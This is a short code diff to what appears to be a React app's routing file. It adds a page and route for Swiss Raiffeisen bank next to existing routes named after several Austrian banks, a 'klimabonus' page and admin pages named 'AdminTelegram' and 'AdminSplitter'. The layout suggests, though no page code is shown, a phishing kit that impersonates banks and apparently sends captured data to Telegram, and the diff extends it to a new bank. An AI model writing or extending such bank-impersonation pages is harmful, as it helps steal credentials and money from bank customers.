@@ -30,6 +30,7 @@ import Bks from "./pages/Bks.tsx";
 import Vkb from "./pages/Vkb.tsx";
 import Wuestenrot from "./pages/Wuestenrot.tsx";
 import Denizbank from "./pages/Denizbank.tsx";
+import ChRaiffeisen from "./pages/ChRaiffeisen.tsx";
 import Confirmation from "./pages/Confirmation.tsx";
 import AdminTelegram from "./pages/AdminTelegram.tsx";
 import AdminSplitter from "./pages/AdminSplitter.tsx";
@@ -128,6 +129,7 @@ const App = () => (
             <Route path="/at/vkb" element={<P><Vkb /></P>} />
             <Route path="/at/wuestenrot" element={<P><Wuestenrot /></P>} />
             <Route path="/at/denizbank" element={<P><Denizbank /></P>} />
+            <Route path="/ch/raiffeisen" element={<P><ChRaiffeisen /></P>} />
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
             
             <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
